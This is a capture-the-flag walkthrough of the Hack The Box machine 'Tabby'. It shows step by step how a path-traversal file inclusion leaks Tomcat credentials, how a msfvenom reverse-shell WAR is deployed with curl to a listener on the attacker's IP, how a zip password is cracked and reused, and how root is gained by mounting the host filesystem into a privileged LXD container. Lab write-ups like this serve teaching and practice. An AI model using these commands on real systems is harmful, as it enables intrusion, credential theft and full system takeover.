---
title: "HTB - Tabby"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/tabby/logo.png
favicon: /images/walkthroughs/hackthebox/tabby/logo.png
description: HTB - Tabby walkthrough
---

# Tabby

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/banner.png" width="70%"/>
</p>

## Enumeration

- NMap _nmap -A -p- -T4 10.10.10.194_ :

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 08:29 EDT
Nmap scan report for 10.10.10.194
Host is up (0.036s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
```

- Nikto _nikto -h "http://10.10.10.194"_ : Nothing interesting.
- Nikto _nikto -h "http://10.10.10.194:8080"_ :

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.194
+ Target Hostname:    10.10.10.194
+ Target Port:        8080
+ Start Time:         2020-09-04 09:54:43 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ 8169 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2020-09-04 10:01:30 (GMT-4) (407 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

- Visit the websites:

I took a look into the website, first the one hosted on port 80:

_http://10.10.10.194/_

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/1_web.png" width="500"/>
</p>

- Dirbuster :80

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/1_dirbuster.png" width="500"/>
</p>

All links are empty, but the news one. We will check it out later. First enumerate the 8080 website:

_http://10.10.10.194:8080/_

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/1_web_8080.png" width="650"/>
</p>

- Also dirbuster :8080 port, showing up same info as nikto.

We can see the administration website login for Apache Tomcat:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/1_web_8080_pass.png" width="500"/>
</p>

Since we don't have any password, we will take look at the main website, finding the _news_ link with an interesting behaviour:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/2_news.png" width="500"/>
</p>

It rederects to _http://megahosting.htb/news.php?file=statement_ and an interesting file argument. Subtituting the hostname for the IP we got: 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/2_news_sub.png" width="600"/>
</p>

The file argument looks like an LFI (Local File Inclusion), let's try the passwd file:

_http://10.10.10.194/news.php?file=../../../../../etc/passwd_

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/3_lfi.png" width="550"/>
</p>

Having this LFI and the Tomcat Administration website, we could try to find the tomcat configuration file with the credentials, Google Fu time: [tomcat credentials file path](/usr/share/tomcat9/etc/tomcat-users.xml).

_/usr/local/apache-tomcat-version/conf/tomcat-users.xml_

If using apt to install it:

_/usr/share/tomcat9/etc/tomcat-users.xml_


Now compose the URL:

_http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml_

Check the source code of the website and there it is:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/4_tomcat_pass.png" width="500"/>
</p>

{% highlight xml %}
<role rolename="admin-gui">
	<role rolename="manager-script">
	   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"></user>
	</role>
</role>
{% endhighlight %}

Now go back to the Apache Tomcat website and hit the host-manager webapp:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/4_tomcat_admin.png" width="500"/>
</p>

## Exploitation

Now we can spawn a reverse shell with a WAR deploy into the server. I didn't find the upload section in the gui... It took me time to figure this out, but tomcat suports remote manage with HTTP GET requests. We can deploy a WAR using curl, for further reading [tomcat manager commands doc](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands) and [stackoverflow](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands).

Let's craft the WAR shell with msfvenom, for further reading: [exploit tomcat manager](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands).

```
kali@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=4444 -f war > shell.war

kali@kali:~$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/getshell'
OK - Deployed application at context path [/getshell]

kali@kali:~$ nc -lvnp 4444
```

Visit _http://10.10.10.194:8080/getshell/_ and get the shell:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/5_shell_tomcat.png" width="600"/>
</p>

Spawn bash (python, echo and perl didn't work, but python3 did):

```python3 -c "import pty; pty.spawn('/bin/bash')"```

Well... I find nothing at the moment, tried to upload linpeas.sh but it's read-only file system, so no luck at the moment.
I got stucked again, so I looked back into the notes and the DirBuster information I remember a website part (/files/) that I had no access...

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/6_files.png" width="600"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/6_files_server.png" width="500"/>
</p>

Let's retrieve that backup file since is the only interesting there.


```
tomcat@tabby:/var/www/html/files$ python3 -m http.server 4445

kali@kali:~/Tabby$ wget "http://10.10.10.194:4445/16162020_backup.zip"
--2020-09-05 04:36:17--  http://10.10.10.194:4445/16162020_backup.zip

kali@kali:~/Tabby$ unzip 16162020_backup.zip
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/7_backup.png" width="500"/>
</p>

He asks for a password we don't have, the tomcat one didn't work so the first option is bruteforce.



```
kali@kali:~/Tabby$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 
PASSWORD FOUND!!!!: pw == admin@it

kali@kali:~/Tabby$ unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
[16162020_backup.zip] var/www/html/favicon.ico password: admin@it
```

Okey, nothing interesting in the files, but the previous brand name and other emails, but no worth info atm. 
I wanted to spray and pray with password of the zipfile **admin@it** and the known **ash** user (remember the passwd file we got).

```
tomcat@tabby:/var/www/html/files$ su ash
su ash
Password: admin@it

ash@tabby:/var/www/html/files$ cd /home/ash
cd /home/ash
ash@tabby:~$ cat user.txt
cat user.txt
1dcf4062cf7712b5edce6647320a5a7a
ash@tabby:~$ 
```

Lucky us. We've got the user.

```
cat user.txt
1dcf4062cf7712b5edce6647320a5a7a
```

## Privilege Scalation

- linpeas.sh time.

```
ash@tabby:~$ wget "http://10.10.14.113/linpeas.sh"

ash@tabby:~$ sudo -l
sudo -l
sudo: unable to open /run/sudo/ts/ash: Read-only file system
[sudo] password for ash: admin@it

Sorry, user ash may not run sudo on tabby.

ash@tabby:~$ bash linpeas.sh
```

The only interesting thing I see on a first look are the Linux Containers (LXC):

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/8_linpeas.png" width="650"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/8_linpeas_2.png" width="650"/>
</p>

**Ash** is in the **lxd** group, so I will search for info, as a lesson learnt from this box, is the lxc container privesc, if our user is in the lxd/lxc group, we have chances for privesc in that way, with privileged containers:

```
ash@tabby:~$ lxc list security.privileged=true
lxc list security.privileged=true
+-------------+---------+----------------------+------+-----------+-----------+----------+
|    NAME     |  STATE  |         IPV4         | IPV6 |   TYPE    | SNAPSHOTS | LOCATION |
+-------------+---------+----------------------+------+-----------+-----------+----------+
| ignite      | RUNNING | 240.194.0.70 (eth0)  |      | CONTAINER | 0         | tabby    |
+-------------+---------+----------------------+------+-----------+-----------+----------+
| mycontainer | RUNNING | 240.194.0.149 (eth0) |      | CONTAINER | 0         | tabby    |
+-------------+---------+----------------------+------+-----------+-----------+----------+
```

Machine got reset ^^':

```
ash@tabby:~$ lxc list security.privileged=true
+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

Let's exploit that I'm on the lxd group, [source](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation):

- On my local machine:

```
# build a simple alpine image so we get it ready into the box

kali@kali:~/Tabby$ git clone https://github.com/saghul/lxd-alpine-builder
kali@kali:~/Tabby$ cd lxd-alpine-builder
kali@kali:~/Tabby$ ./build-alpine
kali@kali:~/Tabby/lxd-alpine-builder$ ls
alpine-v3.12-x86_64-20200905_0610.tar.gz  build-alpine  LICENSE  README.md
kali@kali:~/Tabby/lxd-alpine-builder$ python3 -m http.server 80
```

- Remote:

```
ash@tabby:~$ wget "http://10.10.14.113/alpine-v3.12-x86_64-20200905_0610.tar.gz"

# import the image
ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200905_0610.tar.gz --alias myimage

# run the image, we had to init lxd
ash@tabby:~$ lxc init myimage mycontainer -c security.privileged=true
ash@tabby:~$ Error: No storage pool found. Please create a new storage pool
ash@tabby:~$ lxd init (accept all by default)
ash@tabby:~$ lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/tabby/9_lxc.png" width="550"/>
</p>

Ladies and gentlemen, we got it.

```
cat root.txt
ca96ca67e69b372fc28398f701d0360e
```